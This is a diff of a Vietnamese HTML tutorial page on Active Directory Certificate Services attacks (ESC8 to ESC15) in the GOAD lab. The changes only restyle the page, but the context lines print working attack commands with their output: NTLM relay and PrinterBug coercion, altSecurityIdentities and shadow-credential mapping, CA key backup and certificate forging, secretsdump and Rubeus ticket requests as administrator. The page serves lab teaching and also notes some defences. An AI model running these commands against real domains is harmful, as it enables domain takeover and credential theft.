                     <p>Tuyệt vời! Nó đang yêu cầu xác thực NTLM. Bây giờ hãy thiết lập cuộc tấn công relay:</p>
                     
-                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code># Set up NTLM relay to ADCS HTTP endpoint
+                    <pre class="bg-gray-900 text-blue-400 p-4 rounded-lg overflow-x-auto mb-4"><code># Set up NTLM relay to ADCS HTTP endpoint
 python3 ntlmrelayx.py -t http://braavos.essos.local/certsrv/certfnsh.asp -smb2support --adcs-attack --adcs-template "DomainController"
 
 Impacket v0.11.0 - Copyright 2023 Fortra
@@ -1264,7 +1262,7 @@ HTTP        : success, Cert saved to /tmp/MEEREEN$cert.b64
 </code></pre>
                     
                     <p>Hãy chuyển đổi và sử dụng chứng chỉ:</p>
-                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code># Convert base64 certificate for use
+                    <pre class="bg-gray-900 text-blue-400 p-4 rounded-lg overflow-x-auto mb-4"><code># Convert base64 certificate for use
 cat /tmp/MEEREEN$cert.b64 | base64 -d > meereen.pfx
 
 # Ask for a TGT with the machine certificate
@@ -1293,14 +1291,14 @@ Impacket v0.11.0 - Copyright 2023 Fortra
                     
                     <h3 class="text-xl text-green-400 font-semibold mb-4">Điểm Chính</h3>
                     <p>
-                        Một chứng chỉ được phát hành từ một mẫu <code>NO_SECURITY_EXTENSION</code>
+                        Một chứng chỉ được phát hành từ một mẫu <code class="text-green-400">NO_SECURITY_EXTENSION</code>
                         sẽ vẫn được ánh xạ ngay cả sau khi người dùng thay đổi mật khẩu, làm cho nó trở nên hoàn hảo cho việc duy trì quyền truy cập.
                     </p>
                     
                     <h3 class="text-xl text-green-400 font-semibold mb-4">Quy Trình Khai Thác</h3>
                     <p>Hãy kiểm tra điều này trong môi trường GOAD của chúng ta:</p>
                     
-                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code># Find templates without security extension requirement
+                    <pre class="bg-gray-900 text-blue-400 p-4 rounded-lg overflow-x-auto mb-4"><code># Find templates without security extension requirement
 Certify.exe find /vulnerable
 
 [!] Vulnerable Certificates Templates :
@@ -1371,7 +1369,7 @@ Rubeus.exe asktgt /user:missandei /certificate:missandei.pfx /password:mimikatz
                     
                     <h3 class="text-xl text-green-400 font-semibold mb-4">Phân Tích Mẫu</h3>
                     <p>Kiểm tra xem mẫu có yêu cầu phần mở rộng bảo mật trong GOAD:</p>
-                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code>$templateDN = "CN=ESC9,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local"
+                    <pre class="bg-gray-900 text-blue-400 p-4 rounded-lg overflow-x-auto mb-4"><code>$templateDN = "CN=ESC9,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local"
 $template = Get-ADObject -Identity $templateDN -Properties msPKI-Enrollment-Flag
 
 # The CT_FLAG_NO_SECURITY_EXTENSION flag value is 0x80000 (524288)
@@ -1400,7 +1398,7 @@ if ($template.'msPKI-Enrollment-Flag' -band $NoSecurityExtensionFlag) {
                     </p>
                     <ul class="list-disc list-inside space-y-2 ml-4">
                         <li>
-                            Những kẻ tấn công có quyền ghi trên các đối tượng người dùng có thể sửa đổi <code>altSecurityIdentities</code>
+                            Những kẻ tấn công có quyền ghi trên các đối tượng người dùng có thể sửa đổi <code class="text-green-400">altSecurityIdentities</code>
                         </li>
                         <li>Thuộc tính này ánh xạ các chứng chỉ đến tài khoản người dùng</li>
                         <li>Ánh xạ độc hại cho phép xác thực dựa trên chứng chỉ như các người dùng khác</li>
@@ -1411,7 +1409,7 @@ if ($template.'msPKI-Enrollment-Flag' -band $NoSecurityExtensionFlag) {
                     </p>
                     <ul class="list-disc list-inside space-y-2 ml-4">
                         <li>
-                            Khai thác các cài đặt đăng ký <code>CertificateMappingMethods</code>
+                            Khai thác các cài đặt đăng ký <code class="text-green-400">CertificateMappingMethods</code>
                             yếu
                         </li>
                         <li>Cho phép xác thực chứng chỉ với các tham số chủ thể một phần</li>
@@ -1420,7 +1418,7 @@ if ($template.'msPKI-Enrollment-Flag' -band $NoSecurityExtensionFlag) {
                     <h3 class="text-xl text-green-400 font-semibold mb-4">Ví Dụ Khai Thác</h3>
                     <p>Hãy thử ESC10A trong GOAD:</p>
                     
-                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code># ESC10A - Modify altSecurityIdentities attribute
+                    <pre class="bg-gray-900 text-blue-400 p-4 rounded-lg overflow-x-auto mb-4"><code># ESC10A - Modify altSecurityIdentities attribute
 # First, create a computer account and request machine certificate
 addcomputer.py -computer-name 'EVIL$' -computer-pass 'Password123!' essos/missandei:fr3edom@meereen.essos.local
 
@@ -1473,7 +1471,7 @@ Rubeus.exe asktgt /user:administrator /certificate:evil.pfx /password:Password12
 </code></pre>
                     
                     <p>
-                        Hoàn hảo! Chúng tôi đã thành công trong việc xác thực là quản trị viên bằng cách sử dụng chứng chỉ máy EVIL$ được ánh xạ qua <code>altSecurityIdentities</code>
+                        Hoàn hảo! Chúng tôi đã thành công trong việc xác thực là quản trị viên bằng cách sử dụng chứng chỉ máy EVIL$ được ánh xạ qua <code class="text-green-400">altSecurityIdentities</code>
                         .
                     </p>
                     </div>
@@ -1490,14 +1488,14 @@ Rubeus.exe asktgt /user:administrator /certificate:evil.pfx /password:Password12
                     
                     <p>
                         <strong>Quan trọng:</strong>
-                        "yêu cầu không được mã hóa" chỉ thành công khi CA có Flag <code>IF_ENFORCEENCRYPTICERTREQUEST</code>
+                        "yêu cầu không được mã hóa" chỉ thành công khi CA có Flag <code class="text-green-400">IF_ENFORCEENCRYPTICERTREQUEST</code>
                         được xóa. Nếu Flag này được thiết lập (mặc định an toàn trên các phiên bản Windows hiện đại), giao diện RPC buộc quyền riêng tư gói và cuộc tấn công NTLM relay sẽ thất bại.
                     </p>
                     
                     <h3 class="text-xl text-green-400 font-semibold mb-4">Điều Kiện Tiên Quyết</h3>
                     <p>Hãy kiểm tra cấu hình CA trong GOAD. Kiểm tra xem CA có Flag IF_ENFORCEENCRYPTICERTREQUEST được xóa hay không:</p>
                     
-                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code>certutil -config "braavos.essos.local\ESSOS-CA" -getreg CA\InterfaceFlags
+                    <pre class="bg-gray-900 text-blue-400 p-4 rounded-lg overflow-x-auto mb-4"><code>certutil -config "braavos.essos.local\ESSOS-CA" -getreg CA\InterfaceFlags
 
 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\ESSOS-CA\InterfaceFlags REG_DWORD = 0x0 (0)
 
@@ -1516,7 +1514,7 @@ HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\ESSOS
                     </ol>
                     
                     <h3 class="text-xl text-green-400 font-semibold mb-4">Kỹ Thuật Bỏ Qua</h3>
-                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code>// Create unencrypted certificate request for GOAD environment
+                    <pre class="bg-gray-900 text-blue-400 p-4 rounded-lg overflow-x-auto mb-4"><code>// Create unencrypted certificate request for GOAD environment
 public class ESC11Exploit
 {
     public string CreateUnencryptedRequest(string subject, string altname = "administrator@essos.local")
@@ -1555,8 +1553,8 @@ public class ESC11Exploit
 </code></pre>
                     
                     <p>
-                        Mã C# ở trên minh họa cách một payload yêu cầu chứng chỉ (CSR) có thể được xây dựng. Đối với cuộc tấn công ESC11 thực tế, một kẻ tấn công thường sẽ sử dụng một công cụ như <code>ntlmrelayx.py</code>
-                        đã được điều chỉnh hoặc công cụ tùy chỉnh để chuyển tiếp xác thực NTLM đến giao diện <code>ICertRequestD</code>
+                        Mã C# ở trên minh họa cách một payload yêu cầu chứng chỉ (CSR) có thể được xây dựng. Đối với cuộc tấn công ESC11 thực tế, một kẻ tấn công thường sẽ sử dụng một công cụ như <code class="text-green-400">ntlmrelayx.py</code>
+                        đã được điều chỉnh hoặc công cụ tùy chỉnh để chuyển tiếp xác thực NTLM đến giao diện <code class="text-green-400">ICertRequestD</code>
                         của máy chủ ADCS qua RPC không được mã hóa. Khi relay NTLM được thiết lập, công cụ của kẻ tấn công sẽ gửi CSR (như cái được tạo ra ở trên, thường là cho một tài khoản có đặc quyền hoặc một tài khoản máy với SAN hữu ích) thay mặt cho tài khoản bị chuyển tiếp. Nếu thành công, CA sẽ phát hành chứng chỉ cho mục tiêu được chỉ định trong CSR, hiệu quả là nâng cao đặc quyền.
                     </p>
                     </div>
@@ -1571,17 +1569,17 @@ public class ESC11Exploit
                     <p>ESC12 cũng đề cập đến các lỗ hổng YubiHSM được phát hiện bởi Hans-Joachim Knobloch, nhưng Vector tấn công cụ thể này không được triển khai trong môi trường GOAD tiêu chuẩn.</p>
                     
                     <p>
-                        Trong GOAD, máy chủ CA là <code>braavos.essos.local</code>
+                        Trong GOAD, máy chủ CA là <code class="text-green-400">braavos.essos.local</code>
                         . Giả sử chúng ta đã xâm phạm nó:
                     </p>
                     
                     <h3 class="text-xl text-green-400 font-semibold mb-4">Tạo Chứng Chỉ Vàng (Khi Đã Xâm Phạm Khóa Riêng CA)</h3>
                     <p>
-                        Khi bạn có quyền quản trị CA (như <code>khal.drogo</code>
+                        Khi bạn có quyền quản trị CA (như <code class="text-green-400">khal.drogo</code>
                         trong GOAD), bạn có thể trích xuất khóa riêng của CA và giả mạo các chứng chỉ vàng:
                     </p>
                     
-                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code># Extract CA certificate and private key with certipy
+                    <pre class="bg-gray-900 text-blue-400 p-4 rounded-lg overflow-x-auto mb-4"><code># Extract CA certificate and private key with certipy
 certipy ca -backup -u khal.drogo@essos.local -p horse -dc-ip 192.168.56.12 -ca 'ESSOS-CA' -target 192.168.56.23 -debug
 
 [*] Action: Backup CA
@@ -1643,11 +1641,11 @@ secretsdump.py -k meereen.essos.local -dc-ip 192.168.56.12
                     
                     <ul class="list-disc list-inside space-y-2 ml-4">
                         <li>
-                            Các mẫu chứng chỉ chứa các chính sách cấp phát (được lưu trữ trong thuộc tính <code>msPKI-Certificate-Policy</code>
+                            Các mẫu chứng chỉ chứa các chính sách cấp phát (được lưu trữ trong thuộc tính <code class="text-green-400">msPKI-Certificate-Policy</code>
                             )
                         </li>
                         <li>
-                            Các chính sách cấp phát có thể được liên kết với các nhóm AD qua thuộc tính <code>msDS-OIDToGroupLink</code>
+                            Các chính sách cấp phát có thể được liên kết với các nhóm AD qua thuộc tính <code class="text-green-400">msDS-OIDToGroupLink</code>
                             </li>
                         <li>Khi xác thực với các chứng chỉ như vậy, người dùng có được quyền thành viên nhóm</li>
                     </ul>
@@ -1663,7 +1661,7 @@ secretsdump.py -k meereen.essos.local -dc-ip 192.168.56.12
                         </li>
                         <li>
                             <strong>
-                                Các chính sách cấp phát có thể được liên kết với các nhóm AD qua thuộc tính <code>msDS-OIDToGroupLink</code>
+                                Các chính sách cấp phát có thể được liên kết với các nhóm AD qua thuộc tính <code class="text-green-400">msDS-OIDToGroupLink</code>
                                 </strong>
                         </li>
                         <li>
@@ -1678,7 +1676,7 @@ secretsdump.py -k meereen.essos.local -dc-ip 192.168.56.12
                     <h3 class="text-xl text-green-400 font-semibold mb-4">Quy Trình Khai Thác</h3>
                     <p>Hãy kiểm tra các điều kiện ESC13 trong GOAD:</p>
                     
-                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code># Find templates with issuance policies linked to groups in essos.local
+                    <pre class="bg-gray-900 text-blue-400 p-4 rounded-lg overflow-x-auto mb-4"><code># Find templates with issuance policies linked to groups in essos.local
 Import-Module ActiveDirectory
 
 $templates = Get-ADObject -Filter 'objectClass -eq "pKICertificateTemplate"' -Properties msPKI-Certificate-Policy -SearchBase "CN=Configuration,DC=essos,DC=local"
@@ -1747,7 +1745,7 @@ The command completed successfully.
                     <h2 class="text-2xl text-green-400 font-bold mb-6">ESC14: Khai Thác Chứng Chỉ Bóng và Ánh Xạ Chứng Chỉ Nâng Cao</h2>
                     <div class="bg-gray-800 p-6 rounded-lg space-y-6">
                     <p>
-                        ESC14 đại diện cho các kỹ thuật lạm dụng ánh xạ chứng chỉ nâng cao vượt xa các kỹ thuật cơ bản như <code>altSecurityIdentities</code>
+                        ESC14 đại diện cho các kỹ thuật lạm dụng ánh xạ chứng chỉ nâng cao vượt xa các kỹ thuật cơ bản như <code class="text-green-400">altSecurityIdentities</code>
                         đã được đề cập trong ESC10. Kỹ thuật này tập trung vào chứng chỉ bóng và các kịch bản ánh xạ chứng chỉ đến tài khoản tinh vi.
                     </p>
                     
@@ -1757,7 +1755,7 @@ The command completed successfully.
                     <ul class="list-disc list-inside space-y-2 ml-4">
                         <li>
                             <strong>Chứng Chỉ Bóng</strong>
-                            : Lạm dụng thuộc tính <code>msDS-KeyCredentialLink</code>
+                            : Lạm dụng thuộc tính <code class="text-green-400">msDS-KeyCredentialLink</code>
                             để xác thực dựa trên chứng chỉ
                         </li>
                         <li>
@@ -1793,7 +1791,7 @@ The command completed successfully.
                     <h3 class="text-xl text-green-400 font-semibold mb-4">Quy Trình Khai Thác</h3>
                     <p>Hãy chứng minh các kỹ thuật ESC14 trong môi trường GOAD của chúng ta. ESC14A - Manipulation altSecurityIdentities trong GOAD:</p>
                     
-                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code># First, create a computer account for certificate mapping
+                    <pre class="bg-gray-900 text-blue-400 p-4 rounded-lg overflow-x-auto mb-4"><code># First, create a computer account for certificate mapping
 addcomputer.py -method ldaps -computer-name 'esc14computer$' -computer-pass 'Il0veCertific@te' -dc-ip 192.168.56.12 essos/missandei:fr3edom@192.168.56.12
 
 Impacket v0.11.0 - Copyright 2023 Fortra
@@ -1848,7 +1846,7 @@ Rubeus.exe asktgt /user:administrator /certificate:evil.pfx /password:Password12
                     
                     <h3 class="text-xl text-green-400 font-semibold mb-4">Định Dạng Ánh Xạ X509 Chứng Chỉ</h3>
                     <p>Bài viết tham khảo cung cấp một kịch bản Python để định dạng ánh xạ X509 một cách chính xác:</p>
-                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code>import argparse
+                    <pre class="bg-gray-900 text-blue-400 p-4 rounded-lg overflow-x-auto mb-4"><code>import argparse
 
 def get_x509_issuer_serial_number_format(serial_number: str, issuer_distinguished_name: str) -> str:
     """
@@ -1880,7 +1878,7 @@ X509:&#x3C;I>DC=local,DC=essos,CN=ESSOS-CA &#x3C;SR>110000000000a68816e592b07892
                     
                     <h3 class="text-xl text-green-400 font-semibold mb-4">Sửa Đổi Thuộc Tính LDAP</h3>
                     <p>Kịch bản để sửa đổi thuộc tính altSecurityIdentities:</p>
-                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code>import ldap3
+                    <pre class="bg-gray-900 text-blue-400 p-4 rounded-lg overflow-x-auto mb-4"><code>import ldap3
 
 dn = "CN=khal.drogo,CN=Users,DC=essos,DC=local"
 user = "essos.local\\missandei"
@@ -1918,7 +1916,7 @@ Impacket v0.11.0 - Copyright 2023 Fortra
 </code></pre>
                     
                     <h3 class="text-xl text-green-400 font-semibold mb-4">Duy Trì Quyền Truy Cập với ESC14</h3>
-                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code># ESC14 Persistence - Shadow Credentials for Domain Admin
+                    <pre class="bg-gray-900 text-blue-400 p-4 rounded-lg overflow-x-auto mb-4"><code># ESC14 Persistence - Shadow Credentials for Domain Admin
 # Add shadow credentials to Domain Admin account (if we have permissions)
 python3 pywhisker.py -d essos.local -u khal.drogo -p horse --target administrator --action add --dc-ip 192.168.56.12
 
@@ -1959,7 +1957,7 @@ X509:&#x3C;I>DC=local,DC=essos,CN=ESSOS-CA &#x3C;SR>6100000000001a68816e592b0789
                     <ul class="list-disc list-inside space-y-2 ml-4">
                         <li>
                             <strong>Chứng Chỉ Bóng</strong>
-                            : Sử dụng <code>msDS-KeyCredentialLink</code>
+                            : Sử dụng <code class="text-green-400">msDS-KeyCredentialLink</code>
                             thay vì đăng ký chứng chỉ truyền thống
                         </li>
                         <li>
@@ -1980,8 +1978,8 @@ X509:&#x3C;I>DC=local,DC=essos,CN=ESSOS-CA &#x3C;SR>6100000000001a68816e592b0789
                     <ol class="list-decimal list-inside space-y-2 ml-4">
                         <li>
                             <strong>Giám Sát Các Thuộc Tính Chính</strong>
-                            : Theo dõi các thay đổi đối với <code>msDS-KeyCredentialLink</code>
-                            và <code>altSecurityIdentities</code>
+                            : Theo dõi các thay đổi đối với <code class="text-green-400">msDS-KeyCredentialLink</code>
+                            và <code class="text-green-400">altSecurityIdentities</code>
                         </li>
                         <li>
                             <strong>Hạn Chế Quyền</strong>
@@ -2040,7 +2038,7 @@ X509:&#x3C;I>DC=local,DC=essos,CN=ESSOS-CA &#x3C;SR>6100000000001a68816e592b0789
                         Việc khai thác ESC15 được thực hiện dưới dạng <strong>hai bước</strong>
                         sử dụng khả năng của Đại lý Yêu cầu Chứng chỉ:
                     </p>
-                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code># Step 1: Request certificate with Certificate Request Agent application policy
+                    <pre class="bg-gray-900 text-blue-400 p-4 rounded-lg overflow-x-auto mb-4"><code># Step 1: Request certificate with Certificate Request Agent application policy
 certipy req -u missandei@essos.local -p fr3edom --application-policies "1.3.6.1.4.1.311.20.2.1" -ca ESSOS-CA -template WebServer -dc-ip 192.168.56.12 -target braavos.essos.local
 
 [*] Action: Request a Certificates
@@ -2078,7 +2076,7 @@ Rubeus.exe asktgt /user:administrator /certificate:administrator.pfx /password:m
                         <strong>Phương pháp Thay thế (Ghi đè Chính sách Cấp phát)</strong>
                     </p>
                     <p>Ví dụ Khai thác ESC15 - Phương pháp 1: Sử dụng certreq với tệp INF tùy chỉnh:</p>
-                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code>$infContent = @"
+                    <pre class="bg-gray-900 text-blue-400 p-4 rounded-lg overflow-x-auto mb-4"><code>$infContent = @"
 [NewRequest]
 Subject = "CN=missandei,CN=Users,DC=essos,DC=local"
 KeyLength = 2048
@@ -2094,7 +2092,7 @@ CertificateTemplate = WebServer
 
 $infContent | Out-File -FilePath "esc15.inf"
 </code></pre>
-                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code>certreq -new -f esc15.inf esc15.req
+                    <pre class="bg-gray-900 text-blue-400 p-4 rounded-lg overflow-x-auto mb-4"><code>certreq -new -f esc15.inf esc15.req
 certreq -submit -config "braavos.essos.local\ESSOS-CA" esc15.req
 
 Certificate Request Processor: The request is taken under submission Request ID = 19
@@ -2105,7 +2103,7 @@ Certificate Request Processor: The request is taken under submission Request ID 
                         <li>Chính sách Ứng dụng: Xác thực Khách hàng (được ưu tiên)</li>
                     </ul>
                     <p>Xác minh nội dung chứng chỉ</p>
-                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code>certutil -dump esc15.cer | findstr -i "application\|enhanced"
+                    <pre class="bg-gray-900 text-blue-400 p-4 rounded-lg overflow-x-auto mb-4"><code>certutil -dump esc15.cer | findstr -i "application\|enhanced"
 
 Application Policies:
     [1]Application Policy:
@@ -2128,7 +2126,7 @@ Rubeus.exe asktgt /user:administrator /certificate:esc15.pfx /password:mimikatz
 </code></pre>
                     
                     <p>ESC15 cũng có thể bị lợi dụng cho các cuộc tấn công của Đại lý Yêu cầu Chứng chỉ. Tạo tệp INF cho khả năng của Đại lý Yêu cầu Chứng chỉ:</p>
-                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code>$craInfContent = @"
+                    <pre class="bg-gray-900 text-blue-400 p-4 rounded-lg overflow-x-auto mb-4"><code>$craInfContent = @"
 [NewRequest]
 Subject = "CN=missandei,CN=Users,DC=essos,DC=local"
 KeyLength = 2048
@@ -2144,8 +2142,8 @@ CertificateTemplate = WebServer
 $craInfContent | Out-File -FilePath "esc15-cra.inf"
 </code></pre>
                     <p>
-                        <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code>certreq -new -f esc15-cra.inf esc15-cra.req</code></pre>
-                        <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code>certreq -submit -config "braavos.essos.local\ESSOS-CA" esc15-cra.req</code></pre>
+                        <pre class="bg-gray-900 text-blue-400 p-4 rounded-lg overflow-x-auto mb-4"><code>certreq -new -f esc15-cra.inf esc15-cra.req</code></pre>
+                        <pre class="bg-gray-900 text-blue-400 p-4 rounded-lg overflow-x-auto mb-4"><code>certreq -submit -config "braavos.essos.local\ESSOS-CA" esc15-cra.req</code></pre>
                     </p>
                     <p>Bây giờ chúng ta có thể yêu cầu chứng chỉ thay mặt cho người khác!</p>
                     </div>
@@ -2185,7 +2183,7 @@ $craInfContent | Out-File -FilePath "esc15-cra.inf"
 
                 <div class="space-y-4">
                     <h4 class="text-lg text-green-400 font-semibold">Bước 1: Kiểm tra quyền truy cập Web Enrollment</h4>
-                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto"><code>curl -I http://braavos.essos.local/certsrv/certfnsh.asp
+                    <pre class="bg-gray-900 text-blue-400 p-4 rounded-lg overflow-x-auto"><code>curl -I http://braavos.essos.local/certsrv/certfnsh.asp
 
 HTTP/1.1 401 Unauthorized
 Content-Length: 1293
@@ -2198,7 +2196,7 @@ Date: Thu, 03 Jan 2025 16:45:12 GMT</code></pre>
 
                 <div class="space-y-4">
                     <h4 class="text-lg text-green-400 font-semibold">Bước 2: Thiết lập chuyển tiếp NTLM</h4>
-                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto"><code>python3 ntlmrelayx.py -t http://braavos.essos.local/certsrv/certfnsh.asp -smb2support --adcs-attack --adcs-template "DomainController"
+                    <pre class="bg-gray-900 text-blue-400 p-4 rounded-lg overflow-x-auto"><code>python3 ntlmrelayx.py -t http://braavos.essos.local/certsrv/certfnsh.asp -smb2support --adcs-attack --adcs-template "DomainController"
 
 [*] Running in relay mode to single host
 [*] Setting up SMB Server
@@ -2208,7 +2206,7 @@ Date: Thu, 03 Jan 2025 16:45:12 GMT</code></pre>
 
                 <div class="space-y-4">
                     <h4 class="text-lg text-green-400 font-semibold">Bước 3: Kích hoạt xác thực</h4>
-                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto"><code>python3 printerbug.py essos.local/missandei:fr3edom@meereen.essos.local braavos.essos.local
+                    <pre class="bg-gray-900 text-blue-400 p-4 rounded-lg overflow-x-auto"><code>python3 printerbug.py essos.local/missandei:fr3edom@meereen.essos.local braavos.essos.local
 
 [*] Attempting to trigger authentication via rprn RPC at meereen.essos.local
 [*] Bind OK
@@ -2218,7 +2216,7 @@ Date: Thu, 03 Jan 2025 16:45:12 GMT</code></pre>
 
                 <div class="space-y-4">
                     <h4 class="text-lg text-green-400 font-semibold">Bước 4: Lấy chứng chỉ của máy</h4>
-                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto"><code># Back in ntlmrelayx window:
+                    <pre class="bg-gray-900 text-blue-400 p-4 rounded-lg overflow-x-auto"><code># Back in ntlmrelayx window:
 [*] SMBD-Thread-4: Connection from MEEREEN/192.168.56.12 controlled
 HTTP        : success, Cert saved to /tmp/MEEREEN$cert.b64
 [*] ADCS attack completed. Generated certificate for user MEEREEN$
